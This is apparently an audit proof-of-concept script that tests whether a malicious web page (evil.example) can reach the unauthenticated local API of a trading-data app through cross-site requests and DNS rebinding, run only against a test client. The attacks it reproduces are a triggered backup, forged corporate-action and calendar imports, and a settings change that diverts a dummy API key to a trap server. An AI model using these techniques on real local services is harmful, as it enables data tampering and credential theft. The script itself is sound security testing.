"""A1: cross-site request and DNS-rebinding exposure of the local API (no login by design).
Reproduces what a malicious web page open in the user's browser can do to http://127.0.0.1:5001."""
import json, os, sys, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
sys.path.insert(0, "/workspace/historify-master/historify"); sys.path.insert(0, "/workspace/historify-master/historify/tests")
os.environ.setdefault("HISTORIFY_SECRET_BACKEND", "file")
import tempfile
from tests.mock_provider.server import MockServer
from app.core.services import Services
from app import create_app

mock = MockServer().start()
tmp = tempfile.mkdtemp()
sv = Services(os.path.join(tmp, "i"))
sv.settings.set("openalgo_api_host", mock.url); sv.settings.set("openalgo_api_key", "SECRET-OPENALGO-KEY-123"); sv.settings_changed()
app = create_app({"HISTORIFY_SERVICES": sv, "TESTING": True}, instance_path=sv.instance_path)
c = app.test_client()
EVIL = {"Origin": "https://evil.example", "Referer": "https://evil.example/page"}
res = {}
# 1. simple cross-site POST with no body (no CORS preflight in a browser: <form method=post> or fetch no-cors)
r = c.post("/api/v2/storage/backup", headers=EVIL)
res["no-body POST from evil origin (storage/backup)"] = r.status_code
# 2. multipart upload (a simple request: an auto-submitting <form enctype=multipart/form-data>)
import io
csv_ca = "symbol,exchange,ex_date,kind,ratio_num,ratio_den,cash_amount\nSBIN,NSE,2025-03-10,split,10,1,\n"
c.post("/api/v2/instruments", json={"symbol": "SBIN", "exchange": "NSE"})
r = c.post("/api/v2/corporate-actions/import", headers=EVIL, data={"file": (io.BytesIO(csv_ca.encode()), "x.csv")},
           content_type="multipart/form-data")
res["multipart CA import from evil origin (fake 1:10 split)"] = (r.status_code, r.get_json().get("events") if r.is_json else None)
cal_csv = "exchange,date,is_trading\nNSE,2025-03-27,false\n"
r = c.post("/api/v2/calendar/import", headers=EVIL, data={"file": (io.BytesIO(cal_csv.encode()), "c.csv")},
           content_type="multipart/form-data")
res["multipart calendar import from evil origin (close a trading day)"] = (r.status_code, r.get_json())
# 3. DNS rebinding: evil.example resolves to 127.0.0.1 -> same-origin for the browser; only the Host header differs
captured = {}
class Trap(BaseHTTPRequestHandler):
    def do_POST(self):
        captured["body"] = self.rfile.read(int(self.headers.get("content-length", 0))).decode()
        self.send_response(200); self.send_header("content-type", "application/json"); self.end_headers()
        self.wfile.write(b'{"status":"success","data":{}}')
    def log_message(self, *a): pass
trap = HTTPServer(("127.0.0.1", 0), Trap); threading.Thread(target=trap.serve_forever, daemon=True).start()
H = {"Host": "evil.example:5001", "Origin": "http://evil.example:5001"}
r1 = c.put("/api/v2/settings", headers=H, json={"openalgo_api_host": f"http://127.0.0.1:{trap.server_port}"})
r2 = c.post("/api/v2/settings/test-connection", headers=H)
res["DNS-rebinding: PUT settings host"] = r1.status_code
res["DNS-rebinding: test-connection -> API key sent to attacker"] = "SECRET-OPENALGO-KEY-123" in captured.get("body", "")
print(json.dumps(res, indent=1))
json.dump(res, open("/workspace/audit/a1_cross_site.json", "w"), indent=1)
sv.close(); mock.stop(); trap.shutdown()
